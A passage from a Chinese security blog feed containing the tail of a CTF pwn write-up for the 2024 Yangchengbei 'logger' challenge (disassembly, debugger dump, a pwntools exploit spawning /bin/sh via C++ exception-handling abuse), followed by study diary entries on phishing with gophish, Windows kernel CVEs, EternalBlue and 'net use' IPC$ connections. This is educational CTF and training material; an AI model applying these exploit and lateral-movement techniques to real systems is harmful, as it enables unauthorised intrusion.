class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------.text:<span class="number">0000000000401B</span>8F ; <span class="type">void</span> __noreturn <span class="title function_">sub_401B8F</span><span class="params">()</span></span><br><span class="line">.text:0000000000401B8F sub_401B8F      proc near</span><br><span class="line">.text:0000000000401B8F</span><br><span class="line">.text:0000000000401B8F command         = qword ptr <span class="number">-18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F var_8           = qword ptr <span class="number">-8</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F</span><br><span class="line">.text:<span class="number">0000000000401B</span>8F ; __unwind &#123; <span class="comment">// __gxx_personality_v0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>8F                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>93                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401B</span>94                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401B</span>97                 push    rbx</span><br><span class="line">.text:<span class="number">0000000000401B</span>98                 sub     rsp, <span class="number">18</span>h</span><br><span class="line">.text:<span class="number">0000000000401B</span>9C                 mov     edi, <span class="number">8</span>          ; thrown_size</span><br><span class="line">.text:<span class="number">0000000000401B</span>A1                 call    ___cxa_allocate_exception</span><br><span class="line">.text:<span class="number">0000000000401B</span>A6                 lea     rdx, aEchoHelloYcbCt ; <span class="string">&quot;echo Hello, YCB ctfer!&quot;</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>AD                 mov     [rax], rdx</span><br><span class="line">.text:<span class="number">0000000000401B</span>B0                 mov     edx, <span class="number">0</span>          ; <span class="type">void</span> (*)(<span class="type">void</span> *)</span><br><span class="line">.text:<span class="number">0000000000401B</span>B5                 mov     rcx, cs:_ZTIPKc_ptr</span><br><span class="line">.text:<span class="number">0000000000401B</span>BC                 mov     rsi, rcx        ; lptinfo</span><br><span class="line">.text:<span class="number">0000000000401B</span>BF                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2                 call    ___cxa_throw</span><br><span class="line">.text:<span class="number">0000000000401B</span>C2 ;   &#125; <span class="comment">// starts at 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>C7 ;   catch(<span class="type">char</span> <span class="type">const</span>*) <span class="comment">// owned by 401BC2</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>C7                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401B</span>CB                 cmp     rdx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>CF                 jz      <span class="type">short</span> loc_401BD9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D1                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401B</span>D4                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9 loc_401BD9:                             ; CODE XREF: sub_401B8F+<span class="number">40</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401B</span>D9                 mov     rdi, rax        ; <span class="type">void</span> *</span><br><span class="line">.text:<span class="number">0000000000401B</span>DC                 call    ___cxa_begin_catch</span><br><span class="line">.text:<span class="number">0000000000401B</span>E1                 mov     [rbp+command], rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>E5                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401B</span>E9                 mov     rsi, rax</span><br><span class="line">.text:<span class="number">0000000000401B</span>EC                 lea     rax, aAnExceptionOfT_1 ; <span class="string">&quot;[-] An exception of type String was cau&quot;</span>...</span><br><span class="line">.text:<span class="number">0000000000401B</span>F3                 mov     rdi, rax        ; format</span><br><span class="line">.text:<span class="number">0000000000401B</span>F6                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401B</span>FB ;   try &#123;</span><br><span class="line">.text:<span class="number">0000000000401B</span>FB                 call    _printf</span><br><span class="line">.text:<span class="number">0000000000401</span>C00                 mov     rax, [rbp+command]</span><br><span class="line">.text:<span class="number">0000000000401</span>C04                 mov     rdi, rax        ; command</span><br><span class="line">.text:<span class="number">0000000000401</span>C07                 call    _system</span><br><span class="line">.text:<span class="number">0000000000401</span>C07 ;   &#125; <span class="comment">// starts at 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C0C                 nop</span><br><span class="line">.text:<span class="number">0000000000401</span>C0D                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C12                 jmp     <span class="type">short</span> loc_401C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C14 ;   cleanup() <span class="comment">// owned by 401BFB</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C14                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401</span>C18                 mov     rbx, rax</span><br><span class="line">.text:<span class="number">0000000000401</span>C1B                 call    ___cxa_end_catch</span><br><span class="line">.text:<span class="number">0000000000401</span>C20                 mov     rax, rbx</span><br><span class="line">.text:<span class="number">0000000000401</span>C23                 mov     rdi, rax        ; <span class="class"><span class="keyword">struct</span> _<span class="title">Unwind_Exception</span> *</span></span><br><span class="line"><span class="class">.<span class="title">text</span>:</span><span class="number">0000000000401</span>C26                 call    __Unwind_Resume</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B loc_401C2B:                             ; CODE XREF: sub_401B8F+<span class="number">83</span>↑j</span><br><span class="line">.text:<span class="number">0000000000401</span>C2B                 mov     rbx, [rbp+var_8]</span><br><span class="line">.text:<span class="number">0000000000401</span>C2F                 leave</span><br><span class="line">.text:<span class="number">0000000000401</span>C30                 retn</span><br><span class="line">.text:<span class="number">0000000000401</span>C30 ; &#125; <span class="comment">// starts at 401B8F</span></span><br><span class="line">.text:<span class="number">0000000000401</span>C30 sub_401B8F      endp</span><br></pre></td></tr></table></figure><p>可以看到参数是rbp-0x18处的数据，但是在0x401BE1处程序将rax赋给了rbp-0x18，所以要动调看看赋了什么。动调发现是0x4040a0，所以我们需要在这个地方写入binsh。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/32gx 0x404020</span></span><br><span class="line">0x404020:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404030:       0x3b68732f6e69622f      0x00000000004040a0</span><br><span class="line">0x404040:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404050:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404060:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404070:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404080:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x404090:       0x3b68732f6e69622f      0x3b68732f6e69622f</span><br><span class="line">0x4040a0:       0x0068732f6e69622f      0x00776f6c6672000a</span><br><span class="line">0x4040b0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x4040c0:       0x00007fa631b00848      0x00007fa631b006f8</span><br><span class="line">0x4040d0:       0x00007fa6319908c0      0x0000000000000000</span><br></pre></td></tr></table></figure><p>原本0x4040a0是<code>Buffer Overflow</code>这个字符串，但是利用trace在末尾加截断符的性质可以将这个字符串覆写为binsh。</p><p>至于rbp劫持了为多少，只要rbp-0x18不要超出data段就行了。</p><p>对了，这里一样也是不用顾虑canary的问题，因为抛出异常之后，<code>__stack_chk_fail</code>不会被执行到。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trace</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;details here:&quot;</span>, content)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;records?&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">warn</span>(<span class="params">content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;chocie:&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;plz: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    trace(<span class="string">b&#x27;/bin/sh;&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">trace(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x404020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b *0x401BE1&#x27;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">warn(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>*(<span class="number">0x70</span>//<span class="number">8</span>)+p64(<span class="number">0x404050</span>)+p64(<span class="number">0x401bc7</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">从2024羊城杯logger题目引起的cpp异常处理机制学习</summary>
    
    
    
    <category term="cpp异常处理机制" scheme="https://c-lby.top/categories/cpp%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="cpp异常处理机制" scheme="https://c-lby.top/tags/cpp%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-25</title>
    <link href="https://c-lby.top/2024/08/25/diary/24-8-25/"/>
    <id>https://c-lby.top/2024/08/25/diary/24-8-25/</id>
    <published>2024-08-25T04:54:02.000Z</published>
    <updated>2024-08-25T05:39:48.445Z</updated>
    
    <content type="html"><![CDATA[<p>结营，证书+2，知识+n</p><p>准备一下蓝队的知识吧</p><p>算了学<a href="https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA">protobuf</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;结营，证书+2，知识+n&lt;/p&gt;
&lt;p&gt;准备一下蓝队的知识吧&lt;/p&gt;
&lt;p&gt;算了学&lt;a href=&quot;https://mp.weixin.qq.com/s/lipd1tc9RGW3VW_WEpjQxA&quot;&gt;protobuf&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-24</title>
    <link href="https://c-lby.top/2024/08/24/diary/24-8-24/"/>
    <id>https://c-lby.top/2024/08/24/diary/24-8-24/</id>
    <published>2024-08-24T04:53:57.000Z</published>
    <updated>2024-08-25T04:56:15.507Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://mlm.lingyiwanwu.com/">机器语言大模型MLM</a></p><p>来自高傲的清华</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://mlm.lingyiwanwu.com/&quot;&gt;机器语言大模型MLM&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来自高傲的清华&lt;/p&gt;
</summary>
      
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-23</title>
    <link href="https://c-lby.top/2024/08/23/diary/24-8-23/"/>
    <id>https://c-lby.top/2024/08/23/diary/24-8-23/</id>
    <published>2024-08-23T11:28:37.000Z</published>
    <updated>2024-08-23T11:56:21.017Z</updated>
    
    <content type="html"><![CDATA[<p>今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。</p><p>可能老了，不喜欢太花里胡哨的东西了（</p><p>今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。</p><p>今天似乎过得异常地轻松，比起前几天高强度的学习和考核。总算可以休息一会了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天把终端搞了一下，忽然发现其实自己不是很喜欢zsh那种花里胡哨的风格，也许会在wsl上装（短时间内其实也不是很想），但是虚拟机或者未来装纯净ubuntu的时候不是很想装zsh这种，如果只是光改颜色的话其实也还行，但是并没有目色到合适的，还是用回原生吧，只是把终端背景的透明度改了一改能看到背景了而已，这样子就已经和舒服了。&lt;/p&gt;
&lt;p&gt;可能老了，不喜欢太花里胡哨的东西了（&lt;/p&gt;
&lt;p&gt;今天学了钓鱼的技术，其实总结一下就是gophish的使用，不过这个东西能部署在服务器上，集成一个总的邮件服务器，比settools方便，不过目前可能还是社工钓鱼用得比较多，很少邮件钓鱼了，除非需要大规模测试的，所以也就是学个过程体验个流程，不过确实学到了和学校课程不一样的地方，更多的实际案例和实操其实更能加深我对某个概念事务的印象。&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-21</title>
    <link href="https://c-lby.top/2024/08/21/diary/24-8-21/"/>
    <id>https://c-lby.top/2024/08/21/diary/24-8-21/</id>
    <published>2024-08-21T04:00:36.000Z</published>
    <updated>2024-08-21T17:34:01.763Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/ghostyusheng/article/details/80321483">docker-ce解决官网无法连接的问题</a></p><p>docker换源之后记得要<code>systemctl daemon-reload</code> <code>systemctl restart docker.service</code>重启一下docker相关的服务。</p><p>关于ubuntu22美化的资料：</p><p><a href="https://blog.csdn.net/weixin_44348719/article/details/132521680">https://blog.csdn.net/weixin_44348719/article/details/132521680</a></p><p><a href="https://blog.csdn.net/2301_76911706/article/details/133000145">https://blog.csdn.net/2301_76911706/article/details/133000145</a></p><p><a href="https://blog.csdn.net/qq_44928822/article/details/129358224">https://blog.csdn.net/qq_44928822/article/details/129358224</a></p><p><a href="https://blog.51cto.com/zhangxueliang/5376229">https://blog.51cto.com/zhangxueliang/5376229</a></p><p><a href="https://www.gnome-look.org/browse/">https://www.gnome-look.org/browse/</a></p><p><a href="https://www.cnblogs.com/WHU-TD/p/14010786.html">https://www.cnblogs.com/WHU-TD/p/14010786.html</a></p><p>主界面配置得差不多了，很满意。接下来就是自定义terminal了，交给明天的我来处理吧！</p><p>大概给终端加个背景图片就差不多了，还有就是修改一下pwndbg的显示，依然用wsl里用的模板就行，和tmux一起真的是天作之合，可惜还不熟悉tmux的操作，还得多练。</p><p>gnome-tweaks是可以直接在终端输入后打开UI界面的。gnome的那些插件在安装之前一定要在火狐或者chrome上安装拓展。打开这个网站<code>https://extensions.gnome.org</code>之后就会提示你安装插件了。在火狐上安装插件之后，要手动在插件界面允许与本地gnome交互，不然插件是无效的。然后就可以开始安装拓展了。想要调拓展的设置，要在<code>installed extends</code>界面，就有设置可以调了。</p><p>哦对，本地还要安装<code>gnome-chrome-connector</code>这个软件包。22以前的的软件包名字和23开始名字不一样，但是官网有提示。</p><p>全场最佳，那个跟随鼠标的眼睛（</p><p>有时间还是详细写一篇博文记录一下吧。</p><p>shit忽然想起来时钟插件忘了装，一样明天再装好了。<a href="https://blog.csdn.net/2301_76911706/article/details/133000145">教程</a></p><p>如果可以，真的像买台笔记本专门装一个ubuntu来使用。一定很舒服</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/ghostyusheng/article/details/80321483&quot;&gt;docker-ce解决官网无法连接的问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;docker换源之后记得要&lt;code&gt;systemctl daemon-reload&lt;/code&gt; &lt;code&gt;systemctl restart docker.service&lt;/code&gt;重启一下docker相关的服务。&lt;/p&gt;
&lt;p&gt;关于ubuntu22美化的资料：&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-20</title>
    <link href="https://c-lby.top/2024/08/20/diary/24-8-20/"/>
    <id>https://c-lby.top/2024/08/20/diary/24-8-20/</id>
    <published>2024-08-20T05:27:52.000Z</published>
    <updated>2024-08-22T16:28:49.804Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/zhuminghui/p/16396100.html">bat命令的安装与使用（batcat）</a>支持语法高亮，相当于升级版的cat命令，可以自定义高亮主题。</p><p>linux kernel题目中的cpio文件是一种备份文件，解压流程如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c_lby@laptop:/core$ ls</span><br><span class="line">core.cpio</span><br><span class="line">c_lby@laptop:/core$ mv core.cpio core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ gunzip core.cpio.gz</span><br><span class="line">c_lby@laptop:/core$ cpio -idm &lt; core.cpio</span><br><span class="line">104379 blocks</span><br></pre></td></tr></table></figure><p>感觉今天唯一学会的就是如何使用宝塔搭建站点，虚拟机里搭建环境的话，一般域名就设置成虚拟机的内网IP就行。记得要设置默认页面。如果是MVC模式的框架，一般就一个像index.php这样的入口文件，就设置一个就行。然后数据库的设置，一定要设置好密码用户名和数据库名，一定要和站点配置对得上，不然会报错。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/zhuminghui/p/16396100.html&quot;&gt;bat命令的安装与使用（batcat）&lt;/a&gt;支持语法高亮，相当于升级版的cat命令，可以自定义高亮主题。&lt;/p&gt;
&lt;p&gt;linux kernel题目中的cpio文件是一种备份文件，解压流程如下：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ ls&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;core.cpio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ mv core.cpio core.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ gunzip core.cpio.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c_lby@laptop:/core$ cpio -idm &amp;lt; core.cpio&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104379 blocks&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
  <entry>
    <title>日志 24-8-19</title>
    <link href="https://c-lby.top/2024/08/19/diary/24-8-19/"/>
    <id>https://c-lby.top/2024/08/19/diary/24-8-19/</id>
    <published>2024-08-19T10:43:19.000Z</published>
    <updated>2024-08-20T05:23:39.316Z</updated>
    
    <content type="html"><![CDATA[<p>Windows内核漏洞挖掘，这下就是真正意义上的还没学会走就要学跑了。不过也学了个大概的思路。如果未来考虑走挖洞这条路，最好是平时多调试多复现一些老的漏洞，积累经验和手感。但是其实国内大多数二进制岗位都是应急响应比较多，像赛博昆仑这样的注重挖洞的公司是很少见的。</p><p><a href="https://xz.aliyun.com/t/6008?time__1311=n4+xnD0DgDc7mqCqGNnmexRm7balgbD#toc-1">cve的解析</a></p><p><a href="https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230">k0shl师傅的博客</a></p><p><a href="https://xiaodaozhi.com/exploit/122.html">https://xiaodaozhi.com/exploit/122.html</a></p><p><a href="https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md">https://github.com/leeqwind/HolicPOC/blob/master/windows/win32k/CVE-2015-2546/README.md</a></p><p><a href="https://blog.csdn.net/pangshaohua/article/details/6592390#:~:text=%E8%AE%BE%E7%BD%AE%E6%96%B9%E6%B3%95%EF%BC%9A%20%E2%80%9C%E6%88%91%E7%9A%84%E7%94%B5%E8%84%91%E2%80%9D%E5%B1%9E%E6%80%A7%E4%B8%AD%EF%BC%8C%E9%AB%98%E7%BA%A7%E8%AE%BE%E7%BD%AE%E9%87%8C%EF%BC%8C%20%E6%9C%89%E4%B8%AA%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%EF%BC%8C%20%E5%8F%98%E9%87%8F%E5%90%8D%EF%BC%9A_NT_SYMBOL_PATH,%E5%8F%98%E9%87%8F%E5%80%BC%EF%BC%9ASRV%2A%20%7B%24Path%7D%2Ahttp%3A%2F%2Fmsdl.microsoft.com%2Fdownload%2Fsymbols%2F%20%E5%B0%86%E2%80%9C%20%7B%24Path%7D%E2%80%9D%E6%9B%BF%E6%8D%A2%E4%B8%BA%E8%A6%81%E5%AD%98%E5%82%A8pdb%E7%AC%A6%E5%8F%B7%E8%A1%A8%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E6%AF%94%E5%A6%82%EF%BC%9AC%3APDB">windbg&#x2F;ida自动下载符号表的设置方法</a></p><p><a href="https://www.anquanke.com/post/id/84911">cve复现</a></p><p><a href="https://github.com/AabyssZG/Docker-TCP-Scan">曾哥的新工具</a></p><p><a href="https://www.4hou.com/posts/n7V5">驱动漏洞挖掘入门</a></p><p>可以说是第一次接触到域渗透，一点经验也没有。菜就多练。</p><p>永恒之蓝的使用是基于139和445端口的开放，且特定漏洞版本下才能使用。使用msf框架可以比较方便地对此进行检测盒利用。kali中使用msfconsole。</p><p>445端口是可以直接在cmd中用<code>net use \\ip\ipc$ password /user:username</code>连接的</p><p>如果有完整权限，可以用psexec工具并接管其cmd。这个工具是微软官方的，也可以用\impacket-examples-windows的。</p><p>linux用多了，Windows的命令不会用一点，平时都是用的gui界面，要多学习Windows命令才行</p><p>要开始学习Windows开发等知识了，不然到时候练PoC都看不懂。</p><p>顺便记录一下今天想到的新生赛出题思路。之前忘记是做什么题了，一道简单的ret2text，然而传参却是往后推了一个的，也就是从rdx开始传。所以可以给一个这样的思路：给一个pop rdx，给一个mov rdi,rdx的gadget，然后组合传参。或者能不能自己写一个简单的so库，so中实现一个自定义的system函数，传两个参数，用其他东西占用一个参数位置，让其他参数顺延（也可以用execve）。</p><p>另一个出题想法是给<code>pop r8``call r8</code>这样的gadget，配合固定地址的mmap写shellcode，但是要自己利用栈溢出来执行shellcode。诶等等但是这样岂不是可以把地址写到ret位置上？可以给传入的参数加上字符过滤就好了。比如0x114514这样的地址，一般来说是不合法的，那么就可以在检查字符串的时候提示，地址非法。检查的话，为了防止加偏移绕过，可以用白名单的方式，比如检查是否来自程序基址段或者libc地址段上。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows内核漏洞挖掘，这下就是真正意义上的还没学会走就要学跑了。不过也学了个大概的思路。如果未来考虑走挖洞这条路，最好是平时多调试多复现一些老的漏洞，积累经验和手感。但是其实国内大多数二进制岗位都是应急响应比较多，像赛博昆仑这样的注重挖洞的公司是很少见的。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/6008?time__1311=n4+xnD0DgDc7mqCqGNnmexRm7balgbD#toc-1&quot;&gt;cve的解析&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://whereisk0shl.top/post/a-trick-the-story-of-cve-2024-26230&quot;&gt;k0shl师傅的博客&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="diary" scheme="https://c-lby.top/categories/diary/"/>
    
    
    <category term="diary" scheme="https://c-lby.top/tags/diary/"/>
    
  </entry>
  
